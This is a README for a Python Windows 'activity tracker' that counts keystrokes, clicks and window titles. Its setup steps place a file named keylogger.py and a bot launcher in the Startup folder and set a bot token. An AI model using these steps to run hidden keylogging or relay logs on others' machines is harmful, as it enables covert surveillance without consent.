# Activity Tracker

The **Activity Tracker** script is a Python-based monitoring tool designed to track user activity on a Windows machine. It records keyboard and mouse events, tracks active window titles, and calculates the time spent on different types of activities, such as coding, researching, and other miscellaneous applications. The results are saved in a log file for analysis and review.

---

## Features
- **Mouse Activity Tracking**:
  - Counts left and right mouse clicks.
- **Keyboard Activity Tracking**:
  - Counts the number of key presses.
- **Application Usage Tracking**:
  - Tracks time spent in specific applications (e.g., Visual Studio Code for coding and Microsoft Edge for researching).
- **Active/Inactive Status**:
  - Monitors user activity and determines if the user is active or inactive.
- **Log File Updates**:
  - Automatically updates a log file every second with the latest statistics.
- **Customizable**:
  - Easily extendable to include other applications or features.

---

## How It Works
1. **Mouse and Keyboard Events**:
   - Tracks clicks and key presses using the `pynput` library.
2. **Active Window Detection**:
   - Detects the currently active window title using `win32gui`.
3. **Activity Timer**:
   - Calculates elapsed time and assigns it to different categories based on the active application.
4. **Log File**:
   - Saves activity details in a human-readable format at `C:\usage_log.txt`.

---

## Requirements
- Python 3.7 or higher
- Libraries:
  - `pynput`
  - `psutil`
  - `pywin32`
    
- NodeJS (idk, use any shit)


## Installation

1. **Clone the Repository**:  
   Clone the project to your local machine using the following command:
   ```bash
   git clone https://github.com/iiMrDark/activity-tracker.git
   cd Activity-Tracker
   pip3 install pynput psutil pywin32
   npm i
   ```
   
## Last shit (Setup)
  1. Press `Win + R`, type `shell:startup`, and move `start-bot.cmd` and `keylogger.py` to the Startup folder.
  2. Don't forget to update the bot token in `index.js` and adjust the `index.js` file location in `start-bot.cmd`.


